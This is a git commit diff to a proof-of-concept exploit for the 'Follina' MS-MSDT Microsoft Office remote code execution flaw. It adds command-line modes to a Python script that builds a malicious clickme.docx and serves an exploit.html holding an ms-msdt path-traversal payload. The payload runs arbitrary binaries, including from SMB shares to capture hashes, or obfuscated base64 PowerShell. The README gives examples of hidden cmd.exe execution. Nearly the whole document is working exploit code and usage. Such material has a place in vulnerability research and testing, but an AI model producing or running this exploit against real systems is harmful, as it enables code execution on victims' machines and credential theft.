acb9985662ba11e4c9efebe771f8ef68c8bed55c
Cas van Cooten <chvancooten@gmail.com>
2022-05-30 21:33:29 +0200

    Add 'command' mode,  argument configurations

--- README.md
+++ README.md
@@ -1,11 +1,54 @@
-# 'Follina' Microsoft Office RCE
+# 'Follina' MS-MSDT n-day Microsoft Office RCE
 
-Quick POC to replicate the 'Follina' Office RCE vulnerability for local testing purposes. Running the script will generate the `clickme.docx` payload file in your current working directory, and start a web server with the payload file (`www/exploit.html`). The web server listens on all interfaces by default, but the payload file will point towards your local host for retrieving it. Modify parameters in `follina.py` as needed.
-
-As far as I'm aware the file that is executed needs to end in `.exe`, but you can load it from a remote file share to farm some hashes if you want. Alternatively, you can adapt the payload to run encoded powershell as observed in the original payloads, described by Kevin Beaumont in the blog linked below.
-
-Usage: `python3 ./follina.py`
+Quick POC to replicate the 'Follina' Office RCE vulnerability for local testing purposes. Running the script will generate the `clickme.docx` payload file in your current working directory, and start a web server with the payload file (`www/exploit.html`). The payload and web server parameters are configurable (see examples).
 
 > ⚠ DO NOT USE IN PRODUCTION LEST YOU BE REGARDED A DUMMY
+
+## Usage:
+
+```
+python .\follina.py -h
+usage: follina.py [-h] -m {command,binary} [-b BINARY] [-c COMMAND] [-u URL] [-H HOST] [-p PORT]
+
+options:
+  -h, --help            show this help message and exit
+
+Required Arguments:
+  -m {command,binary}, --mode {command,binary}
+                        Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command
+
+Binary Execution Arguments:
+  -b BINARY, --binary BINARY
+
+Command Execution Arguments:
+  -c COMMAND, --command COMMAND
+                        The encoded command to execute in "command" mode
+
+Optional Arguments:
+  -u URL, --url URL     The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost"
+  -H HOST, --host HOST  The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)
+  -p PORT, --port PORT  The port to run the HTTP server on, defaults to 80
+```
+
+## Examples:
+
+```
+# Execute a local binary
+python .\follina.py -m binary -b \windows\system32\calc.exe
+
+# Execute a binary from a file share (can be used to farm hashes 👀)
+python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe
+
+# Execute an arbitrary powershell command
+python .\follina.py -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"
+
+# Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
+python .\follina.py -m binary -b \windows\system32\calc.exe -u 1.2.3.4
+
+# Only run the webserver on localhost, on port 8080 instead of 80
+python .\follina.py -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
+```
+
+## Cool peeps
 
 Thanks to [Kevin Beaumont](https://twitter.com/GossiTheDog) for [his original analysis](https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e) of the issue, [@KevTheHermit](https://twitter.com/KevTheHermit) for sharing their poc, and [John Hammond](https://twitter.com/_JohnHammond) for their further work on analysing payload requirements. Additional thanks to [@mkolsek](https://twitter.com/mkolsek) for the template [supporting Office 2019](https://twitter.com/mkolsek/status/1531217733546823681), and [@theluemmel](https://twitter.com/theluemmel) for sharing their version of the payload with me.
--- follina.py
+++ follina.py
@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
+import argparse
 import os
 import zipfile
 import http.server
 import socketserver
-
-payload_url = "http://localhost/exploit.html"
-payload = '\\\\\\\\localhost\\\\c$\\\\windows\\\\system32\\\\calc' # Escape extravaganza, insert your payload without .exe (this is always appended)
+import base64
 
 # Helper function to zip whole dir
 # https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
@@ -19,40 +18,86 @@ def zipdir(path, ziph):
                             path
                        ))
 
-# Prepare the doc file
-with open("src/document.xml.rels.tpl", "r") as f:
-    tmp = f.read()
+if __name__ == "__main__":
 
-payload_rels = tmp.format(payload_url = payload_url)
+    # Parse arguments
+    parser = argparse.ArgumentParser()
+    required = parser.add_argument_group('Required Arguments')
+    binary = parser.add_argument_group('Binary Execution Arguments')
+    command = parser.add_argument_group('Command Execution Arguments')
+    optional = parser.add_argument_group('Optional Arguments')
+    required.add_argument('-m', '--mode', action='store', dest='mode', choices={"binary", "command"},
+        help='Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command', required=True)
+    binary.add_argument('-b', '--binary', action='store', dest='binary', 
+        help='The full path of the binary to run. Can be local or remote from an SMB share')
+    command.add_argument('-c', '--command', action='store', dest='command',
+        help='The encoded command to execute in "command" mode')
+    optional.add_argument('-u', '--url', action='store', dest='url', default='localhost',
+        help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost"')
+    optional.add_argument('-H', '--host', action='store', dest='host', default="0.0.0.0",
+        help='The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)')
+    optional.add_argument('-P', '--port', action='store', dest='port', default=80, type=int,
+        help='The port to run the HTTP server on, defaults to 80')
+    args = parser.parse_args()
 
-if not os.path.exists("src/clickme/word/_rels"):
-    os.makedirs("src/clickme/word/_rels")
+    if args.mode == "binary" and args.binary is None:
+        raise SystemExit("Binary mode requires a binary to be specified, e.g. -b '\\\\localhost\\c$\\Windows\\System32\\calc.exe'")
 
-with open("src/clickme/word/_rels/document.xml.rels", "w") as f:
-    f.write(payload_rels)
 
-with zipfile.ZipFile('clickme.docx', 'w', zipfile.ZIP_DEFLATED) as zipf:
-    zipdir('src/clickme/', zipf)
+    if args.mode == "command" and args.command is None:
+        raise SystemExit("Command mode requires a command to be specified, e.g. -c 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\users\\public\\pwned.txt'")
 
-print("Generated 'clickme.docx' in current directory")
+    payload_url = f"http://{args.url}:{args.port}/exploit.html"
 
-# Prepare the HTML payload
-if not os.path.exists("www"):
-    os.makedirs("www")
+    if args.mode == "command":
+        # Original PowerShell execution variant
+        command = args.command.replace("\"", "\\\"")
+        encoded_command = base64.b64encode(bytearray(command, 'utf-16-le')).decode('UTF-8') # Powershell life...
+        payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{encoded_command}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""'''
 
-with open("src/exploit.html.tpl", "r") as f:
-    tmp = f.read()
+    if args.mode == "binary":
+        # John Hammond binary variant
+        binary_path = args.binary.replace('\\', '\\\\').rstrip('.exe')
+        payload = fr'"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$({binary_path})/.exe\""'
 
-payload_html = tmp.format(payload = payload)
+    # Prepare the doc file
+    with open("src/document.xml.rels.tpl", "r") as f:
+        tmp = f.read()
 
-with open("www/exploit.html", "w") as f:
-    f.write(payload_html)
+    payload_rels = tmp.format(payload_url = payload_url)
 
-# Host it on all interfaces
-class Handler(http.server.SimpleHTTPRequestHandler):
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, directory="www", **kwargs)
+    if not os.path.exists("src/clickme/word/_rels"):
+        os.makedirs("src/clickme/word/_rels")
 
-print(f"Serving payload on {payload_url}")
-with socketserver.TCPServer(("", 80), Handler) as httpd:
-    httpd.serve_forever()
+    with open("src/clickme/word/_rels/document.xml.rels", "w") as f:
+        f.write(payload_rels)
+
+    with zipfile.ZipFile('clickme.docx', 'w', zipfile.ZIP_DEFLATED) as zipf:
+        zipdir('src/clickme/', zipf)
+
+    print("Generated 'clickme.docx' in current directory")
+
+
+    # Prepare the HTML payload
+    if not os.path.exists("www"):
+        os.makedirs("www")
+
+    with open("src/exploit.html.tpl", "r") as f:
+        tmp = f.read()
+
+    payload_html = tmp.format(payload = payload)
+
+    with open("www/exploit.html", "w") as f:
+        f.write(payload_html)
+
+    print("Generated 'exploit.html' in 'www' directory")
+
+
+    # Host the payload
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory="www", **kwargs)
+
+    print(f"Serving payload on {payload_url}")
+    with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
+        httpd.serve_forever()
